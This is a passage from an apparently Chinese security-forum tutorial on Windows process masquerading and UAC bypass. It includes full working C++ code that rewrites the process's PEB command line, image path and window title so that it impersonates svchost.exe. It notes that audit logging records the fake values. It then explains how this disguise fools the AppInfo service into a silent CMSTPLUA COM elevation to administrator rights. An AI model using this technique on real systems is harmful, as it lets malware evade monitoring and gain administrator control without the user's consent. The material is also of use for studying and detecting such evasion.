
| 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 |

```cpp
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <wchar.h>

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    USHORT Flags;
    USHORT Length;
    ULONG TimeStamp;
    UNICODE_STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    HANDLE Handle;
} CURDIR, *PCURDIR;

// PEB 中存储进程参数的核心结构体
typedef struct _RTL_USER_PROCESS_PARAMETERS_FULL {
    ULONG MaximumLength;
    ULONG Length;
    ULONG Flags;
    ULONG DebugFlags;
    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;
    CURDIR CurrentDirectory;        // 当前目录
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;   // 映像路径 (也就是 exe 的全路径)
    UNICODE_STRING CommandLine;     // 命令行参数
    PVOID Environment;
    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;
    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;     // 窗口标题
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
    ULONG_PTR EnvironmentSize;
} RTL_USER_PROCESS_PARAMETERS_FULL, *PRTL_USER_PROCESS_PARAMETERS_FULL;

// 重新定义 PEB 以包含完整的 Parameters 指针
typedef struct _PEB_FULL {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN BitField;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PVOID Ldr;
    PRTL_USER_PROCESS_PARAMETERS_FULL ProcessParameters; // 指向参数块
    // 后面的字段对于本演示不重要，省略...
} PEB_FULL, *PPEB_FULL;

void MasqueradeString(UNICODE_STRING* target, const wchar_t* newString) {
    // 1. 计算新字符串长度
    size_t len = wcslen(newString);
    USHORT sizeBytes = (USHORT)(len * sizeof(wchar_t));

    // 2. 申请新的内存块 (在进程堆上)
    // 必须包含空终止符的空间，尽管 UNICODE_STRING 不强制要求空终止，但为了兼容性最好加上
    wchar_t* newBuffer = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeBytes + sizeof(wchar_t));

    if (newBuffer == NULL) {
        printf("[!] Memory allocation failed.\n");
        return;
    }

    // 3. 复制内容
    memcpy(newBuffer, newString, sizeBytes);

    // 4. 修改目标 UNICODE_STRING 的结构成员
    // 这是一个原子操作的模拟，将指针指向新的地址
    target->Buffer = newBuffer;
    target->Length = sizeBytes;
    target->MaximumLength = sizeBytes + sizeof(wchar_t);
}

int main() {
    // 获取当前 32 位进程的 PEB 地址
    // FS:[0x30] 是 32 位系统下 TIB (Thread Information Block) 指向 PEB 的偏移
    #ifdef _WIN64
    printf("[!] Error: Please compile this as x86 (32-bit) for this demonstration.\n");
    return 1;
    #else
    PPEB_FULL pPeb = (PPEB_FULL)__readfsdword(0x30);
    #endif

    PRTL_USER_PROCESS_PARAMETERS_FULL pParams = pPeb->ProcessParameters;

    printf("====================================================\n");
    printf("  PEB Spoofing / Masquerading Demo (32-bit)\n");
    printf("====================================================\n\n");

    printf("[*] Original Information (Read from PEB):\n");
    wprintf(L"    Command Line: %s\n", pParams->CommandLine.Buffer);
    wprintf(L"    Image Path:   %s\n", pParams->ImagePathName.Buffer);
    wprintf(L"    Win Title:    %s\n", pParams->WindowTitle.Buffer);

    printf("\n[*] Press ENTER to execute masquerading...");
    getchar();

    // ---------------------------------------------------------
    // 开始伪装
    // ---------------------------------------------------------

    // 1. 伪装命令行 (这是最常见的，让进程看起来像是在运行合法服务)
    // 比如伪装成 Windows 更新服务
    MasqueradeString(&pParams->CommandLine, L"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv");

    // 2. 伪装映像路径 (部分旧工具会读取这里，而不是查询内核)
    MasqueradeString(&pParams->ImagePathName, L"C:\\Windows\\System32\\svchost.exe");

    // 3. 伪装窗口标题
    MasqueradeString(&pParams->WindowTitle, L"Service Host Process");

    // 4. 伪装当前目录
    MasqueradeString(&pParams->CurrentDirectory.DosPath, L"C:\\Windows\\System32\\");

    // ---------------------------------------------------------
    // 验证结果
    // ---------------------------------------------------------
    printf("\n[+] PEB Modified successfully!\n");
    printf("[*] New Information (Read from PEB):\n");
    wprintf(L"    Command Line: %s\n", pParams->CommandLine.Buffer);
    wprintf(L"    Image Path:   %s\n", pParams->ImagePathName.Buffer);
    wprintf(L"    Win Title:    %s\n", pParams->WindowTitle.Buffer);

    printf("\n[!] Now check Task Manager (Details tab) or Process Hacker.\n");
    printf("    Note: Some EDRs/Tools query the KERNEL (EPROCESS), not PEB, so they might see the real name.\n");
    printf("    However, standard 'Command Line' auditing often logs the fake one.\n");

    printf("\n[*] Press ENTER to exit...");
    getchar();

    return 0;
}
```

![](https://bbs.kanxue.com/upload/attach/202603/944427_XQK73C29RJBE7YV.png)

![](https://bbs.kanxue.com/upload/attach/202603/944427_DZAN3Y422KQWBMG.png)

可以看到进程的部分信息已经被修改了

|  |  |
| --- | --- |
| 1 | `Command Line:  C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv` |

|  |  |
| --- | --- |
| 1 | `Image Path:   C:\Windows\System32\svchost.exe` |

这种修改主要欺骗的是读取 `PEB` 来获取进程信息的工具（某些日志审计工具、早期的反病毒软件）。

后面要实现的 `UAC` 绕过需要欺骗 `AppInfo` 服务（承载了大部分 `UAC` 的验证逻辑），仅仅修改 `ProcessParameters` 是骗不过 `AppInfo` 服务的。`AppInfo` 还会遍历 `PEB->Ldr`（加载器数据），检查当前进程加载的第一个模块（即 `EXE` 自身）的路径。修改 `LDR` 链表的代码实现后面还会提到。

## 4.2 PEB 的局限性

从上面的结果也可以看到，只要对比一下 `Command Line` 的程序名称和 `Image file name`，就可以看出这两者不一致，肯定有问题。查看一下进程的内核结构体 `EPROCESS` 也能发现进程的“真实身份”，为什么这也能轻易实现提权？

关键在于 Windows 为了性能和架构的简便，`AppInfo` 服务（运行在 `svchost.exe` 中）通过 `ReadProcessMemory` 跨进程读取请求者的 `PEB` 内存块。它读取的是用户态的内存，而不是请求内核去查询 `EPROCESS`（内核对象）。如果系统进程频繁访问内核的结构体，会产生很大的开销。为了让 `Explorer.exe` 能够静默完成许多管理任务，系统必须给它开绿灯。

就好比，一个小偷用伪造的工卡想进入办公大楼，保安看过一眼就放行了，因为去调人事档案来核实身份太麻烦了。而且这个伪造的工卡本来属于每天都来单位的财务，保安无条件信任这个工卡。

当然要查一下证件照、看一下监控录像就很容易发现这个人不对劲。当等到发现的时候，小偷已经得逞了。恶意程序篡改 `PEB` 后立刻提权，就能顺利完成恶意操作。

这个比喻可能不太严谨，但大概是这个意思吧。

# 5. 权限提升

## 5.1 进程伪装后的 UAC 绕过

在 `UAC` 机制下，即便是管理员账户登录，默认启动的进程也只是中等完整性（Medium Integrity），只有通过提权操作，才能获得高完整性（High Integrity），从而真正拥有写系统目录、改注册表核心键值的权限。

提权的大致原理是系统内置的 `CMSTPLUA` 组件（实现了该接口）允许静默提权，但前提是调用者必须为受信任的系统进程。攻击者首先修改当前进程的 `PEB`，将自身路径伪装成合法可信的进程，例如 `explorer.exe`。接着，代码使用 `CoGetObject` 配合 `Elevation` 提权字符串去实例化该组件。系统的 `AppInfo` 服务在校验时被 `PEB` 伪装欺骗，从而在独立的 `dllhost.exe` 中免弹窗创建了一个高权限的 `COM` 对象。最后，攻击者调用该接口的 `ShellExec` 方法启动目标程序（如 `cmd.exe`），通过父子进程的权限继承，成功实现无弹窗获取管理员权限。

### 5.1.1 修改 PEB

|  |  |
| --- | --- |
| 1  2  3  4  5 | 
```cpp
#ifdef _WIN64
PMY_PEB pPEB = (PMY_PEB)__readgsqword(0x60);
#else
PMY_PEB pPEB = (PMY_PEB)__readfsdword(0x30);
#endif
``` |

读取 `PEB` 之后然后修改，这个前面介绍了，这里就不多说了。

### 5.1.2 初始化 COM 库

`CoInitialize` 是 Windows API 函数，用于在当前线程上初始化组件对象模型（COM）库，并将线程设置为单线程单元（STA）模式。使用任何 COM 功能前必须调用它（内存分配函数除外），且必须与 `CoUninitialize` 成对使用以释放资源。

> 组件对象模型 (COM) 是微软开发的一种二进制接口标准，旨在实现跨编程语言（如 C++、C#、Python）和跨进程的软件组件复用。它允许以 DLL 或 EXE 形式存在的可重用二进制组件在运行时动态交互，是 ActiveX、OLE 和 DirectX 的技术基础。

|  |  |
| --- | --- |
